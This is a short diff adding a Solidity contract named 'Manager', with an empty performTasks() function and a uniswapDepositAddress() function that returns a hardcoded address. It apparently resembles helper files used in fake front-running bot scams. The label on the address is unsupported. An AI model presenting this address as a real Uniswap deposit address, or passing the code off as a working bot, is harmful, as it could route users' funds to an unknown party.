@@ -1,0 +1,13 @@
+// Coding for front
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x91fdC1D69D2F263e716762933f8f1cBFb44b02e9;
+	}
+}
